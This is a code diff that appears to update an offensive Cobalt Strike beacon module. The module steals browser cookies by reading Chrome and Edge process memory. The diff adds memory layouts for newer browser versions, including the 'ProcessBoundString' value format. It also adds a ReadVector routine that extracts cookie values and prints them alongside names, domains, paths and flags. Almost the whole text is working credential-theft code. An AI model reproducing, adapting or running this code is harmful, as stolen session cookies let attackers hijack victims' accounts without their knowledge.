@@ -13,6 +13,19 @@ struct RemoteString {
     UCHAR strAlloc; //Seems to always be 0x80, honestly no idea what it should mean
 };
 
+struct RemoteVector {
+    uintptr_t begin_;
+    uintptr_t end_;
+    uintptr_t unk; //Seems to be same as the end_ ?
+};
+
+struct ProcessBoundString {
+    RemoteVector maybe_encrypted_data_;
+    size_t original_size_;
+    BYTE unk[8]; //No clue
+    bool encrypted_ = false;
+};
+
 #pragma region Chrome
 enum class CookieSameSite {
     UNSPECIFIED = -1,
@@ -67,7 +80,7 @@ struct CanonicalCookieChrome {
     char partition_key[128];  //Not implemented //This really should be 128 like in Edge... but for some reason it is not?
     CookieSourceScheme source_scheme;
     int source_port;    //Not implemented //End of Net::CookieBase
-    OptimizedString value;
+    ProcessBoundString value; //size 48
     int64_t expiry_date;
     int64_t last_access_date;
     int64_t last_update_date;
@@ -90,7 +103,7 @@ struct CanonicalCookieEdge {
     char partition_key[136];  //Not implemented
     CookieSourceScheme source_scheme;
     int source_port;    //Not implemented //End of Net::CookieBase
-    OptimizedString value;
+    ProcessBoundString value;
     int64_t expiry_date;
     int64_t last_access_date;
     int64_t last_update_date;
@@ -130,6 +143,46 @@ struct CanonicalCookie124 {
     CookiePriority priority;       //Not implemented
     CookieSourceType source_type;    //Not implemented
 };
+
+struct CanonicalCookieChrome130 {
+    uintptr_t _vfptr; //CanonicalCookie Virtual Function table address. This could also be used to scrape all cookies as it is backed by the chrome.dll
+    OptimizedString name;
+    OptimizedString domain;
+    OptimizedString path;
+    int64_t creation_date;
+    bool secure;
+    bool httponly;
+    CookieSameSite same_site;
+    char partition_key[128];  //Not implemented //This really should be 128 like in Edge... but for some reason it is not?
+    CookieSourceScheme source_scheme;
+    int source_port;    //Not implemented //End of Net::CookieBase
+    OptimizedString value;
+    int64_t expiry_date;
+    int64_t last_access_date;
+    int64_t last_update_date;
+    CookiePriority priority;       //Not implemented
+    CookieSourceType source_type;    //Not implemented
+};
+
+struct CanonicalCookieEdge130 {
+    uintptr_t _vfptr; //CanonicalCookie Virtual Function table address. This could also be used to scrape all cookies as it is backed by the chrome.dll
+    OptimizedString name;
+    OptimizedString domain;
+    OptimizedString path;
+    int64_t creation_date;
+    bool secure;
+    bool httponly;
+    CookieSameSite same_site;
+    char partition_key[136];  //Not implemented
+    CookieSourceScheme source_scheme;
+    int source_port;    //Not implemented //End of Net::CookieBase
+    OptimizedString value;
+    int64_t expiry_date;
+    int64_t last_access_date;
+    int64_t last_update_date;
+    CookiePriority priority;       //Not implemented
+    CookieSourceType source_type;    //Not implemented
+};
 #pragma endregion
 
 
@@ -149,6 +202,26 @@ struct RootNode {
     size_t size;
 };
 
+void ReadVector(HANDLE hProcess, RemoteVector vector, DWORD origSize, formatp* buffer) {
+    size_t szSize = vector.end_ - vector.begin_;
+    if (szSize <= 0) {
+        //Some cookies just are like that. tapad.com cookie: TapAd_3WAY_SYNCS for example is buggy even with browser tools
+        PRINT("[-] Invalid value length\n");
+        return;
+    }
+
+    BYTE* buf = (BYTE*)malloc(szSize + 1); //+1 for the string termination
+    if (buf == 0 || !ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(vector.begin_), buf, szSize, nullptr)) {
+        DEBUG_PRINT_ERROR_MESSAGE(TEXT("Failed to read encrypted cookie value"));
+        free(buf);
+        return;
+    }
+
+    memcpy(buf + szSize, "\0", 1);
+    BeaconFormatPrintf(buffer, "%s\n", buf);
+
+    free(buf);
+}
 //Since Chrome uses std::string type a lot, we need to take into account if the string has been optimized to use Small String Optimization
 //Or if it is stored in another address
 void ReadString(HANDLE hProcess, OptimizedString string, formatp* buffer) {
@@ -195,7 +268,7 @@ void PrintValuesEdge(CanonicalCookieEdge cookie, HANDLE hProcess, formatp* buffe
     BeaconFormatPrintf(buffer, "    Name: ");
     ReadString(hProcess, cookie.name, buffer);
     BeaconFormatPrintf(buffer, "    Value: ");
-    ReadString(hProcess, cookie.value, buffer);
+    ReadVector(hProcess, cookie.value.maybe_encrypted_data_, cookie.value.original_size_, buffer);
     BeaconFormatPrintf(buffer, "    Domain: ");
     ReadString(hProcess, cookie.domain, buffer);
     BeaconFormatPrintf(buffer, "    Path: ");
@@ -213,6 +286,29 @@ void PrintValuesEdge(CanonicalCookieEdge cookie, HANDLE hProcess, formatp* buffe
 }
 
 void PrintValuesChrome(CanonicalCookieChrome cookie, HANDLE hProcess, formatp* buffer) {
+    BeaconFormatPrintf(buffer, "    Name: ");
+    ReadString(hProcess, cookie.name, buffer);
+    BeaconFormatPrintf(buffer, "    Value: ");
+    ReadVector(hProcess, cookie.value.maybe_encrypted_data_, cookie.value.original_size_, buffer);
+    BeaconFormatPrintf(buffer, "    Domain: ");
+    ReadString(hProcess, cookie.domain, buffer);
+    BeaconFormatPrintf(buffer, "    Path: ");
+    ReadString(hProcess, cookie.path, buffer);
+    BeaconFormatPrintf(buffer, "    Creation time: ");
+    PrintTimeStamp(cookie.creation_date, buffer);
+    BeaconFormatPrintf(buffer, "    Expiration time: ");
+    PrintTimeStamp(cookie.expiry_date, buffer);
+    BeaconFormatPrintf(buffer, "    Last accessed: ");
+    PrintTimeStamp(cookie.last_access_date, buffer);
+    BeaconFormatPrintf(buffer, "    Last updated: ");
+    PrintTimeStamp(cookie.last_update_date, buffer);
+    BeaconFormatPrintf(buffer, "    Secure: %s\n", cookie.secure ? "True" : "False");
+    BeaconFormatPrintf(buffer, "    HttpOnly: %s", cookie.httponly ? "True" : "False");
+}
+
+#pragma region OldPrints
+
+void PrintValuesChrome130(CanonicalCookieChrome130 cookie, HANDLE hProcess, formatp* buffer) {
     BeaconFormatPrintf(buffer, "    Name: ");
     ReadString(hProcess, cookie.name, buffer);
     BeaconFormatPrintf(buffer, "    Value: ");
@@ -275,6 +371,29 @@ void PrintValuesOld(CanonicalCookieOld cookie, HANDLE hProcess, formatp* buffer)
     BeaconFormatPrintf(buffer, "\n");
 }
 
+void PrintValuesEdge130(CanonicalCookieEdge130 cookie, HANDLE hProcess, formatp* buffer) {
+    BeaconFormatPrintf(buffer, "    Name: ");
+    ReadString(hProcess, cookie.name, buffer);
+    BeaconFormatPrintf(buffer, "    Value: ");
+    ReadString(hProcess, cookie.value, buffer);
+    BeaconFormatPrintf(buffer, "    Domain: ");
+    ReadString(hProcess, cookie.domain, buffer);
+    BeaconFormatPrintf(buffer, "    Path: ");
+    ReadString(hProcess, cookie.path, buffer);
+    BeaconFormatPrintf(buffer, "    Creation time: ");
+    PrintTimeStamp(cookie.creation_date, buffer);
+    BeaconFormatPrintf(buffer, "    Expiration time: ");
+    PrintTimeStamp(cookie.expiry_date, buffer);
+    BeaconFormatPrintf(buffer, "    Last accessed: ");
+    PrintTimeStamp(cookie.last_access_date, buffer);
+    BeaconFormatPrintf(buffer, "    Last updated: ");
+    PrintTimeStamp(cookie.last_update_date, buffer);
+    BeaconFormatPrintf(buffer, "    Secure: %s\n", cookie.secure ? "True" : "False");
+    BeaconFormatPrintf(buffer, "    HttpOnly: %s", cookie.httponly ? "True" : "False");
+}
+
+#pragma endregion
+
 void ProcessNodeValue(HANDLE hProcess, uintptr_t Valueaddr, TargetVersion targetConfig, formatp* buffer) {
 
     if (targetConfig == Chrome) {
@@ -294,6 +413,14 @@ void ProcessNodeValue(HANDLE hProcess, uintptr_t Valueaddr, TargetVersion target
         }
         PrintValuesEdge(cookie, hProcess, buffer);
     }
+    else if (targetConfig == Edge130) {
+        CanonicalCookieEdge130 cookie = { 0 };
+        if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(Valueaddr), &cookie, sizeof(CanonicalCookieEdge130), nullptr)) {
+            PrintErrorWithMessage(TEXT("Failed to read cookie struct"));
+            return;
+        }
+        PrintValuesEdge130(cookie, hProcess, buffer);
+    }
     else if (targetConfig == OldChrome) {
         CanonicalCookieOld cookie = { 0 };
         if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(Valueaddr), &cookie, sizeof(CanonicalCookieOld), nullptr)) {
@@ -301,6 +428,14 @@ void ProcessNodeValue(HANDLE hProcess, uintptr_t Valueaddr, TargetVersion target
             return;
         }
         PrintValuesOld(cookie, hProcess, buffer);
+    }
+    else if (targetConfig == Chrome130) {
+        CanonicalCookieChrome130 cookie = { 0 };
+        if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(Valueaddr), &cookie, sizeof(CanonicalCookieChrome130), nullptr)) {
+            PrintErrorWithMessage(TEXT("Failed to read cookie struct"));
+            return;
+        }
+        PrintValuesChrome130(cookie, hProcess, buffer);
     }
     else if (targetConfig == Chrome124) {
         CanonicalCookie124 cookie = { 0 };
